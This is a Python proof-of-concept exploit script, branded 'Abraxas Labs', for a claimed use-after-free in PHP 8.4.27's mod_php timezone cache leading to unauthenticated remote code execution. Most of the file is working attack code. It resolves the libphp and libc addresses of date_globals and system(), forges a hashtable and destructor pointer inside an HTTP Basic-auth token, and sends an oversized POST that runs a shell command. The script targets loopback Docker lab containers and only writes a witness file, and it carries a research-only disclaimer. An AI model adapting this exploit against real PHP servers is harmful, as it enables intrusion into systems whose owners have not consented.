#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: CVE-2026-129496 (Critical: 9.2)
#  Vendor: PHP (The PHP Group)
#  Versions: PHP 8.4.27 apache2handler (fixed in 8.4.28)
#  Impact: Unauth RCE as the web worker via a freed timezone cache
#  Requires: NTS mod_php; file error_log; startup diagnostic; fresh worker; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "CVE-2026-129496"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _PRINT(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _PRINT(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_PRINT = _builtins.print
_builtins.print = _cprint

"""CVE-2026-129496 lab oracle. Loopback Apache mod_php only."""

import base64
import struct
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path

LABEL = "CVE-2026-129496"
WITNESS = "CVE-2026-129496-RCE"
WITNESS_PATH = "/tmp/w"
VULN_PORT = 18224
PATCHED_PORT = 18225
PROJECT = "cve-2026-129496"
CHUNK_MASK = (1 << 21) - 1
READ_OFF = 0x2000
READ_LEN = 0xD000
HT_OFF = 0x4070
HOLE_OFF = 0x6E00
UTC_HASH = 0x800000000B882791
POST_BODY = b"x=" + b"C" * (3 * 1024 * 1024)
NOTES = Path(__file__).resolve().parent / "poc-last-run.txt"


def run(args: list[str]) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(args, check=False, capture_output=True)


def run_text(args: list[str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(args, check=False, capture_output=True, text=True)


def container_id(service: str) -> str:
    found = run_text(["docker", "compose", "-p", PROJECT, "ps", "-q", service])
    lines = (found.stdout or "").split()
    if found.returncode != 0 or not lines:
        raise RuntimeError(f"no container for {service}")
    return lines[0]


def docker_exec(cid: str, *args: str) -> subprocess.CompletedProcess[bytes]:
    return run(["docker", "exec", "-u", "root", cid, *args])


def docker_text(cid: str, *args: str) -> str:
    proc = run_text(["docker", "exec", "-u", "root", cid, *args])
    if proc.returncode != 0:
        err = (proc.stderr or "").strip()
        raise RuntimeError(err or f"docker exec failed: {args[0]}")
    return proc.stdout or ""


def apache_pids(cid: str) -> tuple[int, int | None]:
    text = docker_text(cid, "ps", "-eo", "pid,stat,user,args")
    parent = 0
    child: int | None = None
    for line in text.splitlines():
        parts = line.split(None, 3)
        if len(parts) < 4:
            continue
        cmd = parts[3]
        # docker-init's argv contains the apache2-foreground string.
        if not (cmd.startswith("apache2") or cmd.startswith("/usr/sbin/apache2")):
            continue
        pid = int(parts[0])
        stat, user = parts[1], parts[2]
        if user == "root" and parent == 0:
            parent = pid
        elif user == "www-data" and "Z" not in stat:
            child = pid
    if parent == 0:
        raise RuntimeError("apache parent not found")
    return parent, child


def map_exec(maps: str, needle: str) -> tuple[int, str]:
    for line in maps.splitlines():
        if needle in line and "r-xp" in line:
            fields = line.split()
            base = int(fields[0].split("-", 1)[0], 16)
            return base, fields[-1]
    raise RuntimeError(f"mapping not found: {needle}")


def read_mem(cid: str, pid: int, addr: int, size: int) -> bytes:
    proc = docker_exec(
        cid,
        "dd",
        f"if=/proc/{pid}/mem",
        "iflag=skip_bytes,count_bytes",
        f"skip={addr}",
        f"count={size}",
        "status=none",
    )
    if proc.returncode != 0 or len(proc.stdout) != size:
        raise RuntimeError(f"short read at {addr:#x}")
    return proc.stdout


def read_file_at(cid: str, path: str, offset: int, size: int) -> bytes:
    proc = docker_exec(
        cid,
        "dd",
        f"if={path}",
        "iflag=skip_bytes,count_bytes",
        f"skip={offset}",
        f"count={size}",
        "status=none",
    )
    if proc.returncode != 0 or len(proc.stdout) != size:
        raise RuntimeError(f"short file read {path}@{offset:#x}")
    return proc.stdout


def _section(shdrs: bytes, index: int, entsize: int) -> tuple[int, ...]:
    return struct.unpack_from("<IIQQQQIIQQ", shdrs, index * entsize)


def elf_symbol(cid: str, path: str, symbol: str) -> int:
    hdr = read_file_at(cid, path, 0, 64)
    if hdr[:4] != b"\x7fELF" or hdr[4] != 2 or hdr[5] != 1:
        raise RuntimeError(f"{path} is not ELF64 LE")
    e_shoff = struct.unpack_from("<Q", hdr, 40)[0]
    e_shentsize, e_shnum, e_shstrndx = struct.unpack_from("<HHH", hdr, 58)
    shdrs = read_file_at(cid, path, e_shoff, e_shentsize * e_shnum)
    shstr_off, shstr_size = _section(shdrs, e_shstrndx, e_shentsize)[4:6]
    shstr = read_file_at(cid, path, shstr_off, shstr_size)

    def sec_name(index: int) -> str:
        start = _section(shdrs, index, e_shentsize)[0]
        end = shstr.index(b"\x00", start)
        return shstr[start:end].decode()

    want = symbol.encode()
    for sec in (".symtab", ".dynsym"):
        chosen = next((i for i in range(e_shnum) if sec_name(i) == sec), None)
        if chosen is None:
            continue
        _n, _t, _f, _a, sym_off, sym_size, link, _i, _al, entsize = _section(
            shdrs, chosen, e_shentsize
        )
        str_off, str_size = _section(shdrs, link, e_shentsize)[4:6]
        syms = read_file_at(cid, path, sym_off, sym_size)
        strs = read_file_at(cid, path, str_off, str_size)
        step = entsize or 24
        for pos in range(0, len(syms) - step + 1, step):
            st_name, _info, _other, st_shndx, st_value, _sz = struct.unpack_from(
                "<IBBHQQ", syms, pos
            )
            if st_shndx == 0:
                continue
            raw = strs[st_name : strs.find(b"\x00", st_name)]
            if raw.split(b"@", 1)[0] == want:
                return st_value
    raise RuntimeError(f"{symbol} missing in {path}")


def rx_bias(cid: str, path: str, rx_base: int) -> int:
    hdr = read_file_at(cid, path, 0, 64)
    e_phoff = struct.unpack_from("<Q", hdr, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", hdr, 54)
    phdrs = read_file_at(cid, path, e_phoff, e_phentsize * e_phnum)
    for index in range(e_phnum):
        p_type, p_flags, _off, p_vaddr = struct.unpack_from(
            "<IIQQ", phdrs, index * e_phentsize
        )
        if p_type == 1 and p_flags & 1:
            return rx_base - p_vaddr
    raise RuntimeError(f"no executable LOAD in {path}")


def recycle_worker(cid: str) -> int:
    _parent, child = apache_pids(cid)
    if child is not None:
        docker_exec(cid, "kill", "-TERM", str(child))
    for _ in range(50):
        _parent, new = apache_pids(cid)
        if new is not None and new != child:
            time.sleep(0.4)
            return new
        time.sleep(0.2)
    raise RuntimeError("worker did not respawn")


def build_request(cid: str) -> tuple[bytes, str]:
    parent, _child = apache_pids(cid)
    maps = docker_text(cid, "cat", f"/proc/{parent}/maps")
    if "aarch64" not in maps:
        raise RuntimeError("lab image is not aarch64")
    libphp_base, libphp_path = map_exec(maps, "/usr/lib/apache2/modules/libphp.so")
    libc_base, libc_path = map_exec(maps, "/libc.so.6")
    date_globals = rx_bias(cid, libphp_path, libphp_base) + elf_symbol(
        cid, libphp_path, "date_globals"
    )
    system = rx_bias(cid, libc_path, libc_base) + elf_symbol(cid, libc_path, "system")
    tz = struct.unpack("<Q", read_mem(cid, parent, date_globals + 16, 8))[0]
    chunk = tz & ~CHUNK_MASK
    if tz - chunk != HT_OFF:
        raise RuntimeError(f"tzcache offset {tz - chunk:#x}")
    image = read_mem(cid, parent, chunk + READ_OFF, READ_LEN)
    ht_at = HT_OFF - READ_OFF
    if image[ht_at : ht_at + 4] != b"\x01\x00\x00\x00":
        raise RuntimeError("startup hashtable image missing")
    # The Basic decode is the child's first large allocation and lands on this
    # startup image. A leading "u:" plus NUL skips the password copy.
    content = bytearray(image[0x18:])
    content[0:3] = b"u:\x00"

    def at(addr: int) -> int:
        return addr - (chunk + 0x2018)

    hole = chunk + HOLE_OFF
    if content[at(hole) : at(hole) + 256] != b"\x00" * 256:
        raise RuntimeError("heap hole is not empty")
    ar = hole + 64
    key = ar + 0x60
    content[at(hole) : at(hole) + 64] = b"\xff" * 64
    struct.pack_into("<I", content, at(hole) + 4, 2)
    cmd = f"printf %s {WITNESS}>{WITNESS_PATH}".encode()
    if len(cmd) >= 63:
        raise RuntimeError("command does not fit in the bucket prefix")
    content[at(ar) : at(ar) + len(cmd)] = cmd
    content[at(ar) + len(cmd)] = 0
    struct.pack_into("<II", content, at(key), 1, 6)
    struct.pack_into("<Q", content, at(key) + 8, UTC_HASH)
    struct.pack_into("<Q", content, at(key) + 16, 3)
    content[at(key) + 24 : at(key) + 28] = b"UTC\x00"
    bucket = ar + 64
    struct.pack_into("<Q", content, at(bucket), chunk + 0xE000)
    struct.pack_into("<II", content, at(bucket) + 8, 0x0D, 0xFFFFFFFF)
    struct.pack_into("<Q", content, at(bucket) + 16, UTC_HASH)
    struct.pack_into("<Q", content, at(bucket) + 24, key)
    ht = at(chunk + HT_OFF)
    struct.pack_into("<II", content, ht, 1, 7)
    struct.pack_into("<II", content, ht + 8, 0x10, 0xFFFFFFF0)
    struct.pack_into("<Q", content, ht + 16, ar)
    struct.pack_into("<IIII", content, ht + 24, 1, 1, 8, 0)
    struct.pack_into("<Q", content, ht + 40, 0)
    struct.pack_into("<Q", content, ht + 48, system)
    token = base64.b64encode(bytes(content))
    how = (
        f"chunk={chunk:#x} tz={tz:#x} system={system:#x} "
        f"date_globals={date_globals:#x} decode_at={chunk + READ_OFF:#x}"
    )
    return token, how


def send(port: int, token: bytes) -> tuple[str, bool]:
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/index.php",
        data=POST_BODY,
        method="POST",
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("Authorization", "Basic " + token.decode("ascii"))
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read(120)
            return f"status={resp.status} body={body!r}", False
    except urllib.error.HTTPError as exc:
        body = exc.read(120)
        return f"status={exc.code} body={body!r}", False
    except (urllib.error.URLError, TimeoutError, ConnectionError) as exc:
        return f"{type(exc).__name__}: {exc}", True


def witness_bytes(cid: str) -> bytes | None:
    proc = docker_exec(cid, "cat", WITNESS_PATH)
    if proc.returncode != 0:
        return None
    return proc.stdout


def php_version(cid: str) -> str:
    return docker_text(cid, "php", "-r", "echo PHP_VERSION;").strip()


def startup_line(cid: str) -> str:
    text = docker_text(cid, "cat", "/var/log/php-error.log")
    for line in text.splitlines():
        if "Invalid date.timezone" in line and "error_log" in line or (
            "Invalid date.timezone" in line and "PHP Startup" in line
        ):
            return line.strip()
    if "Invalid date.timezone" not in text:
        raise RuntimeError("startup diagnostic missing from file error_log")
    return "Invalid date.timezone"


def main() -> int:
    lines: list[str] = []
    rce = False
    crash = {"vuln": False, "patched": False}
    how = ""
    images = ""
    got: bytes | None = None
    try:
        vuln = container_id("vuln")
        patched = container_id("patched")
        vuln_log = startup_line(vuln)
        patched_log = startup_line(patched)
        for cid in (vuln, patched):
            mods = docker_text(cid, "apache2ctl", "-M")
            if "mpm_prefork_module" not in mods or "php_module" not in mods:
                raise RuntimeError("prefork mod_php is not loaded")
        images = (
            f"vuln=php:8.4.27-apache/{php_version(vuln)} "
            f"patched=php:8.4.28-apache/{php_version(patched)}"
        )
        token, how = build_request(vuln)
        docker_exec(vuln, "rm", "-f", WITNESS_PATH)
        docker_exec(patched, "rm", "-f", WITNESS_PATH)
        recycle_worker(vuln)
        vuln_reply, crash["vuln"] = send(VULN_PORT, token)
        got = witness_bytes(vuln)
        recycle_worker(patched)
        patched_reply, crash["patched"] = send(PATCHED_PORT, token)
        other = witness_bytes(patched)
        witness_ok = got == WITNESS.encode()
        rce = witness_ok and other is None and not crash["patched"]
        lines.extend(
            [
                "pin=fresh-worker",
                f"images={images}",
                f"ports=127.0.0.1:{VULN_PORT},127.0.0.1:{PATCHED_PORT}",
                "sapi=apache2handler",
                "addrs=lab-maps",
                "date.timezone=Not/AZone",
                "error_log=/var/log/php-error.log",
                "memory_limit=2M",
                "LimitRequestFieldSize=8388608",
                f"crash vuln={'yes' if crash['vuln'] else 'no'} "
                f"patched={'yes' if crash['patched'] else 'no'}",
                f"witness={'yes' if witness_ok else 'no'}",
                f"patched-witness={'absent' if other is None else 'present'}",
                f"vuln-reply {vuln_reply}",
                f"patched-reply {patched_reply}",
                f"startup-log vuln={vuln_log}",
                f"startup-log patched={patched_log}",
                f"how={how}",
                "reason=stale tzcache freed at MINIT; Basic decode overlaps it; "
                "POST above memory_limit bails out before RINIT; post_deactivate "
                "calls the forged destructor",
            ]
        )
        if witness_ok:
            lines.append(WITNESS)
    except (RuntimeError, OSError, subprocess.SubprocessError, ValueError) as exc:
        lines.append(f"error={exc}")
        lines.append(
            "crash="
            + ("yes" if crash["vuln"] and not crash["patched"] else "no")
        )
        rce = False
    head = f"{'SUCCESS' if rce else 'FAIL'} {LABEL} rce={'yes' if rce else 'no'}"
    text = "\n".join([head, *lines, "SUCCESS" if rce else "FAIL"]) + "\n"
    NOTES.write_text(text, encoding="utf-8")
    print(text, end="")
    return 0 if rce else 1


if __name__ == "__main__":
    raise SystemExit(main())

